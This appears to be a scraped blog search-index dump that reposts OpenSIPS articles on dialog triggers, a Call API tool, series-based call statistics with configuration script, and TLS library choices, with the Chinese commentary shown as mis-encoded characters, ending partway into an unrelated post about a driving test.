credit=credit-$var(cost) where id=$dlg_val(account_id)\u0026#34;); # give the dialog 5 more seconds $DLG_timeout = 5; # update the total cost $dlg_val(total_cost) = $(dlg_val(total_cost){s.int}) + $var(cost); } else { # query returned nothing, so no credit is available, allow the call # to timeout and terminate right away } release_dynamic_lock( \u0026#34;$dlg_val(account_id)\u0026#34; ); } route[call_terminated] { # the dialog data (vars, flags, profiles) are accesible here. xlog(\u0026#34;[$DLG_id] call terminated after $DLG_lifetime seconds with a cost of $dlg_val(total_cost)\\n\u0026#34;); # IMPROVEMENT - eventually ajust the call if the call didn\u0026#39;t used # the whole span of the last 5 seconds } SHARE THIS: ","permalink":"https://wdd.js.org/opensips/blog/dialog-trigers/","summary":"åŸæ–‡ï¼šhttps://blog.opensips.org/2020/05/26/dialog-triggers-or-how-to-control-the-calls-from-script/\nThe OpenSIPS script is a very powerful tool, both in terms of capabilities (statements, variables, transformations) and in terms of integration (support for DB, REST, Events and more).So why not using the OpenSIPS script (or the script routes) to interact and control your call, in order to build more complex services on top of the dialog support?For this purpose, OpenSIPS 3.1 introduces three new per-dialog triggers:\non_answer route, triggered when the dialog is answered; on_timeout route, triggered when the dialog is about to timeout; on_hangup route, triggered after the dialog was terminated.","title":"Dialog triggers, or how to control the calls from script"},{"content":" çœ‹æ¥OpenSIPSçš„ç›®æ ‡å·²ç»ä¸ä»…ä»…å±€é™äºåšä»£ç†äº†ï¼Œè€Œæ˜¯æƒ³åšå‘¼å«æ§åˆ¶ã€‚\nåŸæ–‡ï¼šhttps://blog.opensips.org/2020/06/11/calls-management-using-the-new-call-api-tool/\nThe new Call API project consists of a standalone server able to serve a set of API commands that can be used to control SIP calls (such as start a new call, put a call on hold, transfer it to a different destination, etc.). In order to provide high performance throughput, the server has been developed in Go programming language, and provides a WebSocket interface that is able to handle Json-RPC 2.0 requests and notifies.Although it runs as a standalone daemon able to control calls, it does not directly interact with SIP calls, but just communicates with a SIP proxy that actually provides the SIP stack and intermediates the calls. The first release of the Call API is using OpenSIPS for this purposes, but this is a loose requirement â€“ in the future other SIP stacks can be used, with the appropriate connectors.\nArchitecture In terms of architecture, the new Call API tool consists of multiple units, the most important ones being:\nClients interface â€“ this unit is responsible for receiving Json-RPC requests over WebSocket from clients and pass them to the Commands unit Management interface â€“ this is the unit that communicates with the SIP proxy in order to instruct what needs to be done Event interface â€“ listens for event from the SIP proxy and passes them to the Commands unit Commands unit â€“ this is the unit that implements the commands logic, ensuring the interaction between all the above interfaces. Communication between these units is done asynchronous using go-routines. Below you can find a diagram that shows how all these units are interconnected\nDemo Below you can watch a video that shows how you can use some of the features the Call API tool provides, such as:\nStart a call between two participants Put the call on hold Resume the call from hold Transfer a call to a different destination Terminate an ongoing call Enjoy watching!\n","permalink":"https://wdd.js.org/opensips/blog/calls-manager/","summary":"çœ‹æ¥OpenSIPSçš„ç›®æ ‡å·²ç»ä¸ä»…ä»…å±€é™äºåšä»£ç†äº†ï¼Œè€Œæ˜¯æƒ³åšå‘¼å«æ§åˆ¶ã€‚\nåŸæ–‡ï¼šhttps://blog.opensips.org/2020/06/11/calls-management-using-the-new-call-api-tool/\nThe new Call API project consists of a standalone server able to serve a set of API commands that can be used to control SIP calls (such as start a new call, put a call on hold, transfer it to a different destination, etc.). In order to provide high performance throughput, the server has been developed in Go programming language, and provides a WebSocket interface that is able to handle Json-RPC 2.","title":"Calls management using the new Call API tool"},{"content":" æ—©æœŸ1xå’Œ2xç‰ˆæœ¬çš„OpenSIPSï¼Œç»Ÿè®¡æ¨¡å—åªæœ‰ä¸¤ç§æ¨¡å¼ï¼Œä¸€ç§æ—¶è®¡ç®—å€¼ï¼Œå¦ä¸€ç§æ˜¯ä»è¿è¡Œå¼€å§‹çš„ç´¯åŠ å€¼ã€‚è€Œæ— æ³•è·å–æ¯”å¦‚è¯´æœ€è¿‘ä¸€åˆ†é’Ÿï¼Œæœ€è¿‘5åˆ†é’Ÿï¼Œè¿™æ ·çš„åŸºäºä¸€å®šå‘¨æœŸçš„ç»Ÿè®¡å€¼ï¼Œåœ¨OpenSIPS 3.2ä¸Šï¼Œæä¾›äº†æ–°çš„è§£å†³æ–¹æ¡ˆã€‚\nåŸæ–‡ï¼šhttps://blog.opensips.org/2021/02/02/improved-series-based-call-statistics-using-opensips-3-2/\nReal-time call statistics is an excellent tool to evaluate the quality and performance of your telephony platform, that is why it is very important to expose as many statistics as possible, accumulated over different periods of time.OpenSIPS provides an easy to use interface that exposes simple primitives for creating, updating, and displaying various statistics, both well defined as well as tailored to your needs. However, the current implementation comes with a limitation: statistics are gathered starting from the beginning of the execution, up to the point they are read. In other words, you cannot gather statistics only for a limited time frame.That is why starting with OpenSIPS 3.2, the statistics module was enhanced with a new type of statistics, namely statistics series, that allow you to provide custom stats accumulated over a specific time window (such as one second, one minute, one hour, etc.). When the stat is evaluated, only the values gathered within the specified time window is accounted, all the others are simply dropped (similar to a time-based circular buffer, or a sliding window). Using these new stats, you can easily provide standard statistics such as ACD, AST, PPT, ASR, NER, CCR in a per minute/hour fashion.\nProfiles In order to use the statistics series you first need to define a statistics profile, which describes certain properties of the statistics to be used, such as:\nthe duration of the time frame to be used â€“ the number of seconds worth of data that should be accumulated for the statistics that use this profile; all data gathered outside of this time window is discarded the granularity of the time window â€“ the number of slots used for each series â€“ the more slots, the more accurate the statistic is, with a penalty of an increased memory footprint how to group statistics to make them easier to process the processing algorithm â€“ or how data should be accumulated and interpreted when the statistic is evaluated; this is presented in the next chapter The profile needs to be specified every time data is pushed in a statistic series, so that the engine knows how to process it.\nAlgorithms The statistics series algorithm describe how the data gathered over the specified time window should be processed. There are several algorithms available:\naccumulate â€“ this is useful when you want to count the number of times a specific event appears (such as number of requests, replies, dialogs, etc); for this algorithm, the statistic is represented as a simple counter that accumulates when data is fed, and is decreased when data (out of the sliding window) expires average â€“ this is used to compute an average value over the entire window frame; this is useful to compute average call duration (ACD) or average post dial delay (PDD) over a specified time window percentage â€“ used to compute the percentage of some data out of a total number of entries; useful to compute different types of ratios, such as Answer-seizure ratio (ASR), NER or CCR Usage The new functionality can be leveraged by defining one (or more) stat_series_profiles, and then feed data to that statistic according to your scriptâ€™s logic using the update_stat_series() function. In order to evaluate the result of the stats, one can use the $stat() variable from within OpenSIPSâ€™s script, or access it from outside using the get_statistics MI command.As a quick theoretical example, let us consider creating two statistics: one that counts the number of initial INVITE requests per minute your platform receives, and another one that shows the ratio of the INVITE requests out of all the other requests received.First, we shall define the two profiles that describe how the new statistics should be interpreted: the first one, should be a counter that accumulates all the initial INVITEs received in one minute, and the second one should be a percentage series, is incremented for initial INVITEs, and decremented for all the others. Both statistics series will use a 60s (one minute) window:modparam(\u0026ldquo;statistics\u0026rdquo;, \u0026ldquo;stat_series_profile\u0026rdquo;, \u0026ldquo;inv_acc_per_min: algorithm=accumulate window=60\u0026rdquo;)modparam(\u0026ldquo;statistics\u0026rdquo;, \u0026ldquo;stat_series_profile\u0026rdquo;, \u0026ldquo;inv_perc_per_min: algorithm=percentage window=60\u0026rdquo;)Now, in the main route, we shell update statistics with data:\u0026hellip;route {Â \u0026hellip;Â if (is_method(\u0026ldquo;INVITE\u0026rdquo;) \u0026amp;\u0026amp; has_totag()) {Â update_stat_series(\u0026ldquo;inv_acc_per_min\u0026rdquo;, \u0026ldquo;INVITE_per_min\u0026rdquo;, \u0026ldquo;1\u0026rdquo;);Â update_stat_series(\u0026ldquo;inv_perc_per_min\u0026rdquo;, \u0026ldquo;INVITE_ratio\u0026rdquo;, \u0026ldquo;1\u0026rdquo;);Â } else {Â update_stat_series(\u0026ldquo;inv_perc_per_min\u0026rdquo;, \u0026ldquo;INVITE_ratio\u0026rdquo;, \u0026ldquo;-1\u0026rdquo;);Â }Â xlog(\u0026ldquo;INVITEs per min $stat(INVITE_per_min) represents $stat(INVITE_ratio)% of total requests\\n\u0026rdquo;);Â \u0026hellip;}\u0026hellip;You can query these statistics through the MI interface by running:opensips-cli -x mi get_statistics INVITE_per_min INVITE_ratio\nUse case In a production environment, the KPIs you provide your customers are very important, as they describe the quality of the service you provide. Some of these are quite standard indices (ACD, ASR, AST, PDD, NER, CCR), that are relevant for specific period of times (one minute, ten minutes, one hour). In the following paragraphs we will see how we can provide these statistics on a customer basis, as well as overall.First, we need to understand what each stat represents, to understand the logic that has to be scripted:\nASR (Answer Seizure Ratio) â€“ the percentage of telephone calls which are answered (200 reply status code) CCR (Call Completion Ratio) â€“ the percentage of telephone calls which are signaled back by the far-end client. Thus, 5xx, 6xx reply codes and internal 408 timeouts generated before reaching the client do not count here. The following is always true: CCR \u0026gt;= ASR _PDD (Post Dial Delay)Â _â€“ the duration, in milliseconds, between the receival of the initial INVITE and the receival of the first 180/183 provisional reply (the call state advances to â€œringingâ€) AST (Average Setup Time) â€“ the duration, in milliseconds, between the receival of the initial INVITE and the receival of the first 200 OK reply (the call state advances to â€œansweredâ€). The following is always true: AST \u0026gt;= PDD ACD (Average Call Duration) â€“ the duration, in seconds, between the receival of the initial INVITE and the receival of the first BYE request from either participant (the call state advances to â€œendedâ€) NER (Network Effectiveness Ratio) â€“ measures the ability of a server to deliver the call to the called terminal; in addition to ASR, NER also considers busy and user failures as success Now that we know what we want to see, we can start scripting: we need to load the statistics module, and define two types of profiles: one that computes average indices (used for AST, PDD, ACD), and one for percentage indices (used for ASR, NER, CCR). For each of them, we define 3 different time windows: per minute, per 10 minutes and per hour:\nloadmodule \u0026#34;statistics.so\u0026#34; modparam(\u0026#34;statistics\u0026#34;, \u0026#34;stat_series_profile\u0026#34;, \u0026#34;perc: algorithm=percentage group=stats\u0026#34;) modparam(\u0026#34;statistics\u0026#34;, \u0026#34;stat_series_profile\u0026#34;, \u0026#34;10m-perc: algorithm=percentage window=600 slots=10 group=stats_10m\u0026#34;) modparam(\u0026#34;statistics\u0026#34;, \u0026#34;stat_series_profile\u0026#34;, \u0026#34;1h-perc: algorithm=percentage window=3600 slots=6 group=stats_1h\u0026#34;) modparam(\u0026#34;statistics\u0026#34;, \u0026#34;stat_series_profile\u0026#34;, \u0026#34;avg: algorithm=average group=stats\u0026#34;) modparam(\u0026#34;statistics\u0026#34;, \u0026#34;stat_series_profile\u0026#34;, \u0026#34;10m-avg: algorithm=average window=600 slots=10 group=stats_10m\u0026#34;) modparam(\u0026#34;statistics\u0026#34;, \u0026#34;stat_series_profile\u0026#34;, \u0026#34;1h-avg: algorithm=average window=3600 slots=6 group=stats_1h\u0026#34;) In order to catch all the relevant events we need to hook on, we will be using the E_ACC_CDR and E_ACC_MISSED_EVENT events exposed by the accounting module. In order to have identify the customer that the events were triggered for, we need to export the customerâ€™s identifier in the event:\nloadmodule \u0026#34;acc.so\u0026#34; modparam(\u0026#34;acc\u0026#34;, \u0026#34;extra_fields\u0026#34;,\u0026#34;evi: customer\u0026#34;) route { ... if (has_totag() \u0026amp;\u0026amp; is_method(\u0026#34;INVITE\u0026#34;)) { do_accounting(\u0026#34;evi\u0026#34;, \u0026#34;cdr|missed\u0026#34;); t_on_reply(\u0026#34;stats\u0026#34;); # store the moment the call started get_accurate_time($avp(call_start_s), $avp(call_start_us)); # TODO: store the customer\u0026#39;s id in $acc_extra(customer) } ... } When a reply comes in, our â€œstatsâ€ reply route will be called, where we will update all the statistics, according to our logic. Because we need to compute them twice, once for global statistics, and once for customerâ€™s one, we will put the logic in a new route, â€œcalculate_stats_replyâ€, that we call when a reply comes in:\nonreply_route[stats] { route(calculate_stats_reply, $avp(call_start_s), $avp(call_start_us), \u0026#34;\u0026#34;); route(calculate_stats_reply, $avp(call_start_s), $avp(call_start_us), $acc_extra(customer)); } route[calculate_stats_reply] { # expects: # - param 1: timestamp (in seconds) when the initial request was received # - param 2: timestamp (in microseconds) when the initial request was received # - param 3: statistic identifier; for global, empty string is used if ($rs == \u0026#34;180\u0026#34; || $rs == \u0026#34;183\u0026#34; || $rs == \u0026#34;200\u0026#34; || $rs == \u0026#34;400\u0026#34; || $rs == \u0026#34;403\u0026#34; || $rs == \u0026#34;408 || $rs == \u0026#34;480\u0026#34; || $rs == \u0026#34;487\u0026#34;) { if (!isflagset(\u0026#34;FLAG_PDD_CALCULATED\u0026#34;)) { get_accurate_time($var(now_s), $var(now_us)); ts_usec_delta($var(now_s), $var(now_us), $param(1), $param(2), $var(pdd_us)); $var(pdd_ms) = $var(pdd_us) / 1000; # milliseconds $avp(pdd) = $var(pdd_ms); setflag(\u0026#34;FLAG_PDD_CALCULATED\u0026#34;); } else { $var(pdd_ms) = $avp(pdd); } update_stat_series(\u0026#34;avg\u0026#34;, \u0026#34;PDD$param(3)\u0026#34;, $var(pdd_ms)); update_stat_series(\u0026#34;10m-avg\u0026#34;, \u0026#34;PDD_10m$param(3)\u0026#34;, $var(pdd_ms)); update_stat_series(\u0026#34;1h-avg\u0026#34;, \u0026#34;PDD_1h$param(3)\u0026#34;, $var(pdd_ms)); } if ($rs \u0026gt;= 200 \u0026amp;\u0026amp; $rs \u0026lt; 300) { update_stat_series(\u0026#34;perc\u0026#34;, \u0026#34;ASR$param(3)\u0026#34;, 1); update_stat_series(\u0026#34;10m-perc\u0026#34;, \u0026#34;ASR_10m$param(3)\u0026#34;, 1); update_stat_series(\u0026#34;1h-perc\u0026#34;, \u0026#34;ASR_1h$param(3)\u0026#34;, 1); update_stat_series(\u0026#34;perc\u0026#34;, \u0026#34;NER$param(3)\u0026#34;, 1); update_stat_series(\u0026#34;10m-perc\u0026#34;, \u0026#34;NER_10m$param(3)\u0026#34;, 1); update_stat_series(\u0026#34;1h-perc\u0026#34;, \u0026#34;NER_1h$param(3)\u0026#34;, 1); update_stat_series(\u0026#34;perc\u0026#34;, \u0026#34;CCR$param(3)\u0026#34;, 1); update_stat_series(\u0026#34;10m-perc\u0026#34;, \u0026#34;CCR_10m$param(3)\u0026#34;, 1); update_stat_series(\u0026#34;1h-perc\u0026#34;, \u0026#34;CCR_1h$param(3)\u0026#34;, 1); get_accurate_time($var(now_s), $var(now_us)); ts_usec_delta($var(now_s), $var(now_us), $param(1), $param(2), $var(ast_us)); $var(ast_us) = $var(ast_us) / 1000; # milliseconds update_stat_series(\u0026#34;avg\u0026#34;, \u0026#34;AST$param(3)\u0026#34;, $var(ast_us)); update_stat_series(\u0026#34;10m-avg\u0026#34;, \u0026#34;AST_10m$param(3)\u0026#34;, $var(ast_us)); update_stat_series(\u0026#34;1h-avg\u0026#34;, \u0026#34;AST_1h$param(3)\u0026#34;, $var(ast_us)); } } In case of a successful call, the dialog generates a CDR, that we use to update our ACD statistics:\nevent_route[E_ACC_CDR] { route(calculate_stats_cdr, $param(duration), $param(setuptime), \u0026#34;\u0026#34;); route(calculate_stats_cdr, $param(duration), $param(setuptime), $param(customer)); } route[calculate_stats_cdr] { # expects: # - param 1: duration (in seconds) of the call # - param 2: setuptime (in seconds) of the call # - param 3: optional - statistic identifier; global is empty string $var(total_duration) = $param(1) + $param(2); update_stat_series(\u0026#34;avg\u0026#34;, \u0026#34;ACD$param(3)\u0026#34;, $var(total_duration)); update_stat_series(\u0026#34;10m-avg\u0026#34;, \u0026#34;ACD_10m$param(3)\u0026#34;, $var(total_duration)); update_stat_series(\u0026#34;1h-avg\u0026#34;, \u0026#34;ACD_1h$param(3)\u0026#34;, $var(total_duration)); } And in case of a failure, we update the corresponding statistics:\nevent_route[E_ACC_MISSED_EVENT] { route(calculate_stats_failure, $param(code), \u0026#34;\u0026#34;); route(calculate_stats_failure, $param(code), $param(customer)); } route[calculate_stats_failure] { # expects: # - param 1: failure code # - param 2: statistic identifier; global is empty string update_stat_series(\u0026#34;perc\u0026#34;, \u0026#34;ASR$param(3)\u0026#34;, -1); update_stat_series(\u0026#34;10m-perc\u0026#34;, \u0026#34;ASR_10m$param(3)\u0026#34;, -1); update_stat_series(\u0026#34;1h-perc\u0026#34;, \u0026#34;ASR_1h$param(3)\u0026#34;, -1); if ($param(1) == \u0026#34;486\u0026#34; || $param(1) == \u0026#34;408\u0026#34;) { update_stat_series(\u0026#34;perc\u0026#34;, \u0026#34;NER$param(3)\u0026#34;, 1); update_stat_series(\u0026#34;10m-perc\u0026#34;, \u0026#34;NER_10m$param(3)\u0026#34;, 1); update_stat_series(\u0026#34;1h-perc\u0026#34;, \u0026#34;NER_1h$param(3)\u0026#34;, 1); } else { update_stat_series(\u0026#34;perc\u0026#34;, \u0026#34;NER$param(3)\u0026#34;, -1); update_stat_series(\u0026#34;10m-perc\u0026#34;, \u0026#34;NER_10m$param(3)\u0026#34;, -1); update_stat_series(\u0026#34;1h-perc\u0026#34;, \u0026#34;NER_1h$param(3)\u0026#34;, -1); } if ($(param(1){s.int}) \u0026gt; 499) { update_stat_series(\u0026#34;perc\u0026#34;, \u0026#34;CCR$param(3)\u0026#34;, -1); update_stat_series(\u0026#34;10m-perc\u0026#34;, \u0026#34;CCR_10m$param(3)\u0026#34;, -1); update_stat_series(\u0026#34;1h-perc\u0026#34;, \u0026#34;CCR_1h$param(3)\u0026#34;, -1); } else { update_stat_series(\u0026#34;perc\u0026#34;, \u0026#34;CCR$param(3)\u0026#34;, 1); update_stat_series(\u0026#34;10m-perc\u0026#34;, \u0026#34;CCR_10m$param(3)\u0026#34;, 1); update_stat_series(\u0026#34;1h-perc\u0026#34;, \u0026#34;CCR_1h$param(3)\u0026#34;, 1); } } And we are all set â€“ all you have to do is to run traffic through your server, query the statistics (over MI) at your desired pace (such as every minute), and plot them nicely in a graph to improve your monitoring experience .\nPossible enhancements There is currently no way of persisting these statistics over a restart â€“ this means that every time you restart, the new statistics have to be re-computed, resulting in possible misleading results. In the future, it would be nice if we could provide some sort of persistent storage for them.All statistics are currently local, although it might be possible aggregate values across multiple servers using some scripting + cluster broadcast messages from script. Ideally, we shall implement this in an automatic fashion using the clusterer module.Finally, although there are currently only three algorithms supported (accumulate, percentage and average), more can be added quite easily â€“ we shall do that in future versions.Enjoy your new statistics!\n","permalink":"https://wdd.js.org/opensips/blog/call-stat/","summary":"æ—©æœŸ1xå’Œ2xç‰ˆæœ¬çš„OpenSIPSï¼Œç»Ÿè®¡æ¨¡å—åªæœ‰ä¸¤ç§æ¨¡å¼ï¼Œä¸€ç§æ—¶è®¡ç®—å€¼ï¼Œå¦ä¸€ç§æ˜¯ä»è¿è¡Œå¼€å§‹çš„ç´¯åŠ å€¼ã€‚è€Œæ— æ³•è·å–æ¯”å¦‚è¯´æœ€è¿‘ä¸€åˆ†é’Ÿï¼Œæœ€è¿‘5åˆ†é’Ÿï¼Œè¿™æ ·çš„åŸºäºä¸€å®šå‘¨æœŸçš„ç»Ÿè®¡å€¼ï¼Œåœ¨OpenSIPS 3.2ä¸Šï¼Œæä¾›äº†æ–°çš„è§£å†³æ–¹æ¡ˆã€‚\nåŸæ–‡ï¼šhttps://blog.opensips.org/2021/02/02/improved-series-based-call-statistics-using-opensips-3-2/\nReal-time call statistics is an excellent tool to evaluate the quality and performance of your telephony platform, that is why it is very important to expose as many statistics as possible, accumulated over different periods of time.OpenSIPS provides an easy to use interface that exposes simple primitives for creating, updating, and displaying various statistics, both well defined as well as tailored to your needs. However, the current implementation comes with a limitation: statistics are gathered starting from the beginning of the execution, up to the point they are read.","title":"Improved series-based call statistics using OpenSIPS 3.2"},{"content":" OpenSIPSå’ŒOpenSSLä¹‹é—´çš„é›†æˆæ€»æ˜¯å­˜åœ¨å„ç§ä¸ªæ ·çš„é—®é¢˜ã€‚æˆ‘ä¹‹å‰å°±é‡åˆ°æ­»é”çš„é—®é¢˜ï¼Œopensips CPU cpuå ç”¨å¾ˆé«˜ã€‚ä½†æ˜¯ä¸å†å¤„ç†SIPæ¶ˆæ¯ã€‚æœ€ç»ˆæ’æŸ¥ä¸‹æ¥ï¼Œæ˜¯å’ŒOpenSSLæœ‰å…³ã€‚ æ·±å±‚æ¬¡çš„åŸå› ï¼Œæ˜¯å› ä¸ºOpenSIPSæ˜¯ä¸ªå¤šè¿›ç¨‹çš„ç¨‹åºï¼Œè€ŒOpenSSLä¸»è¦æ˜¯é¢å‘å¤šçº¿ç¨‹çš„ç¨‹åºã€‚ åœ¨OpenSIPS3.2ç‰ˆæœ¬ä¸Šï¼Œå®˜æ–¹å›¢é˜Ÿåˆ—å‡ºäº†å‡ ä¸ªOpenSSLçš„æ›¿ä»£å“ï¼Œå¹¶è¿›è¡Œä¼˜åŠ£å¯¹æ¯”ï¼Œæœ€ç»ˆé€‰æ‹©ä¸€ä¸ªæ¯”è¾ƒå¥½çš„æ–¹æ¡ˆã€‚ æˆ‘ä»¬ä¸€èµ·æ¥çœ‹çœ‹å§ã€‚\nFor the purpose of providing secure SIP communication over the TLS protocol, OpenSIPS uses the OpenSSL library, the most popular TLS implementation across the Internet. However, integrating OpenSSL with OpenSIPS has posed a series of challenges starting with OpenSSL version 1.1.0, and has caused quite a few bugs and crashes since then, as presented in more detail in this article.As such, for the new OpenSIPS 3.2 version, we have finally decided to provide support for an additional TLS library, as an alternative to OpenSSL. In this article, we are going to take a look at the options we have explored and the criteria and factors that we used to choose a candidate.\nIssues with OpenSSL Even though up to this point, we have been able to solve the encountered issues, new problems continue to emerge and there are still ongoing reports and Github tickets on this topic. The main reason for this, in short, is that OpenSSL is designed with multi-threaded applications in mind, and is incompatible with certain design principles of a multi-process application like OpenSIPS. OpenSSL is not intended to be used in an environment where TLS connections can be shared between multiple worker processes.\nRequirements for a new TLS library First, we considered the following general requirements for the new TLS library to use in OpenSIPS:\ncross-platform support, availability for many operating systems (ideally, through the default package repository); comprehensive, up to date documentation; support for the the latest and widely used protocols and encryption algorithms; mature, lively project and good adoption. But more precisely, in order for a TLS library to be viable for OpenSIPS, in the light of our multi-process architecture constraints, we specifically look for:\nthread-safe design (in OpenSIPS we only have a single thread per process, but we doÂ concurrently access the library from multiple processes nonetheless); hooks for providing custom memory allocation functions (instead of the system malloc() family), to make sure the TLS connection contexts are allocated in OpenSIPS shared memory, similarly to CRYPTO_set_mem_functions() in OpenSSL; hooks for providing custom locking mechanisms (primitives like create, lock, unlock mutex) in order to synchronize access between processes to the shared TLS connection contexts, similarly to the obsolete CRYPTO_set_locking_callback() in OpenSSL; no use of specific, per-thread memory zone storage mechanisms like Thread Local Storage (which OpenSSL adopted in version 1.1.1, and caused further crashes in OpenSIPS). Candidates In this section we are going to list the top candidates that we have identified in our search for the best TLS implementation that fits OpenSIPS and provide a short conclusion on the findings on each one.\nOpenSSL forks Even though prominent OpenSSL forks like LibreSSL (forked by OpenBSD project from OpenSSL 1.0.1g) or _BoringSSLÂ (forked by Google), seem good options from other perspectives (like features or availability),Â _they fail to bring or keep from old OpenSSL, the required mechanisms for properly integrating with OpenSIPS. LibreSSL for example has dropped both CRYPTO_set_mem_functions() and CRYPTO_set_locking_callback().\nGnuTLS Popular among free and open source software, GnuTLSâ€™s documentation on thread safety does not seem to indicate that it is safe to share TLS session objects between threads. Moreover, the library uses hard-coded mutex implementations (e.g., pthreads on GNU/Linux and CriticalSection on Windows) for several aspects, like random number generation (this operation has led to issues in OpenSSL). In terms of custom application hooks, GnuTLS does offer **gnutls_global_set_mutex() **for locking, but since version 3.3.0 has droppedÂ gnutls_global_set_mem_functions() for memory allocation, which is a must for OpenSIPS shared memory.\nMbed TLS Formerly known as PolarSSL, MbedTLS is a library designed for embedded devices and for the purpose of better integration with different systems, offers abstraction layers for memory allocation and threading mechanisms. OpenSIPS can take advantage of this features by installing its own handlers via mbedtls_platform_set_calloc_free() and mbedtls_threading_set_alt(). The downside in this case is that the customisations are only available if the library is compiled with specific flags, which are not enabled by default. This would mean that TLS in OpenSIPS would not properly work with the library installed directly from packages, which is not a desirable approach.\nWolfSSL Previously called _yaSSLÂ _/ CyaSSL, WolfSSL is a lightweight TLS library aimed at embedded devices. It has achieved high distribution volumes on all systems nevertheless, due to formerly being bundled with MySQL, as the default TLS implementation. As it is the case with Mbed TLS, the libraryâ€™s high portability design can be exploited for better integration with OpenSIPS. WolfSSL provides a hook for setting custom memory allocation functions through wolfSSL_SetAllocators() but does not offer a way to change the locking mechanism at runtime (unless compiled differently). However, the documentation and forum discussions on this matter, suggest that as long as access to shared connection contexts is synchronised at the user application level, the library will not internally acquire any mutexes and no concurrency issues will arise.\nFinal choice Based on our evaluation of the available TLS libraries, WolfSSL seems to be a good TLS implementation overall and the most appropriate to work with OpenSIPSâ€™s multi-process design and constraints. In conclusion, starting with OpenSIPS 3.2, we plan on providing the possibility of choosing between WolfSSL and OpenSSL for the TLS needs in OpenSIPS.\nå‚è€ƒï¼šhttps://blog.opensips.org/2021/02/11/exploring-ssl-tls-libraries-for-opensips-3-2/\n","permalink":"https://wdd.js.org/opensips/blog/opensips3-tls/","summary":"OpenSIPSå’ŒOpenSSLä¹‹é—´çš„é›†æˆæ€»æ˜¯å­˜åœ¨å„ç§ä¸ªæ ·çš„é—®é¢˜ã€‚æˆ‘ä¹‹å‰å°±é‡åˆ°æ­»é”çš„é—®é¢˜ï¼Œopensips CPU cpuå ç”¨å¾ˆé«˜ã€‚ä½†æ˜¯ä¸å†å¤„ç†SIPæ¶ˆæ¯ã€‚æœ€ç»ˆæ’æŸ¥ä¸‹æ¥ï¼Œæ˜¯å’ŒOpenSSLæœ‰å…³ã€‚ æ·±å±‚æ¬¡çš„åŸå› ï¼Œæ˜¯å› ä¸ºOpenSIPSæ˜¯ä¸ªå¤šè¿›ç¨‹çš„ç¨‹åºï¼Œè€ŒOpenSSLä¸»è¦æ˜¯é¢å‘å¤šçº¿ç¨‹çš„ç¨‹åºã€‚ åœ¨OpenSIPS3.2ç‰ˆæœ¬ä¸Šï¼Œå®˜æ–¹å›¢é˜Ÿåˆ—å‡ºäº†å‡ ä¸ªOpenSSLçš„æ›¿ä»£å“ï¼Œå¹¶è¿›è¡Œä¼˜åŠ£å¯¹æ¯”ï¼Œæœ€ç»ˆé€‰æ‹©ä¸€ä¸ªæ¯”è¾ƒå¥½çš„æ–¹æ¡ˆã€‚ æˆ‘ä»¬ä¸€èµ·æ¥çœ‹çœ‹å§ã€‚\nFor the purpose of providing secure SIP communication over the TLS protocol, OpenSIPS uses the OpenSSL library, the most popular TLS implementation across the Internet. However, integrating OpenSSL with OpenSIPS has posed a series of challenges starting with OpenSSL version 1.1.0, and has caused quite a few bugs and crashes since then, as presented in more detail in this article.As such, for the new OpenSIPS 3.","title":"Exploring SSL/TLS libraries for OpenSIPS 3.2"},{"content":"ç§‘ç›®äºŒå€’åº“å’Œå››é¡¹ç»ƒçš„å·®ä¸å¤šäº†ï¼Œå†³å®šå»å‚åŠ è€ƒè¯•ï¼Œè€ƒè¯•è™½ç„¶ä¸€æ³¢ä¸‰æŠ˜ï¼Œä½†ç»“æœè¿˜æ˜¯å¥½çš„ï¼Œä¸€æ¬¡é€šè¿‡äº†\nè€ƒåœºç†Ÿæ‚‰ è€ƒåœºå€’åº“æœ‰14å„åŒºï¼Œæ²¡ä»€ä¹ˆå¥½è®²çš„ã€‚ å››é¡¹æœ‰4å„ç¯çº¿ï¼Œæ¯ä¸ªç¯çº¿ä¸Šæœ‰ä¸¤ä¸ªè€ƒè¯•çº¿è·¯ï¼Œæ‰€ä»¥ä¸€å…±æ˜¯8æ¡çº¿è·¯ åŠ¡å¿…çœ‹æ‡‚å„ç§ç¬¦å·çš„å«ä¹‰ï¼Œä¾‹å¦‚æ›²çº¿ï¼Œä¾§æ–¹ï¼Œ ç›´è§’ä¸å¡é“ ã€é‡ç‚¹ã€‘å½“ä½ çŸ¥é“ä½ è‡ªå·±åœ¨é‚£æ¡çº¿ä¸Šè€ƒè¯•ä¹‹åï¼ŒåŠ¡å¿…å¯¹ç…§ç€çº¿è·¯å›¾ï¼Œå°†å››é¡¹çš„é¡ºåºä»¥åŠä½ç½®ç‰¢è®°äºå¿ƒã€‚è™½ç„¶è·¯ä¸Šä¼šæœ‰ç‰Œå­æŒ‡ç¤ºä¸‹ä¸€é¡¹å†…å®¹æ˜¯ä»€ä¹ˆï¼Œä½†æ˜¯è€ƒè¯•çš„æ—¶å€™ï¼Œç”±äºè§†çº¿ç­‰å„ç§åŸå› å¯èƒ½ä¸ä¼šå»åœ¨æ„ã€‚ä¹Ÿæœ‰äººï¼Œçœ‹åˆ°å‰é¢æ˜¯ç›´è§’ï¼Œå°±ä»¥ä¸ºæ˜¯å‰é¢æ˜¯ç›´è§’è½¬å¼¯ï¼Œç»“æœåˆ°äº†çœŸæ­£ç›´è§’è½¬å¼¯çš„ä½ç½®ï¼Œå´æ²¡æœ‰åšç›´è§’ç›¸å…³çš„æ“ä½œï¼Œå¯¼è‡´è€ƒè¯•å¤±è´¥ã€‚ ä¾‹å¦‚ï¼Œå½“ä½ è¢«é€‰æ‹©åˆ°8å·çº¿çš„å››é¡¹æ—¶ï¼Œä½ åˆ°äº†7-8å¾…è€ƒç­‰å¾…åŒºåï¼Œç­‰å¾…è‡ªå·±çš„è€ƒè¯•è½¦ã€‚åœ¨ç­‰å¾…è¿‡ç¨‹ä¸­æŒ‰ç…§å¹³é¢å›¾ï¼Œå¯ä»¥å‘ç°ï¼Œç¦»å¾…è€ƒæœ€è¿‘çš„èµ·ç‚¹ä¹‹åï¼Œ8å·çº¿ï¼Œç¬¬ä¸€ä¸ªè€ƒè¯•é¡¹ç›®ä¾§æ–¹åœè½¦ï¼Œç„¶åæ˜¯ç›´è§’è½¬å¼¯ï¼Œæ¥ç€æ˜¯Så¼¯ï¼Œæœ€åæ˜¯å¡é“ã€‚\næ¨¡æ‹Ÿè€ƒç›¸å…³ æ¨¡æ‹Ÿçš„è´¹ç”¨ä»¥åŠé¡¹ç›®å†…å®¹ 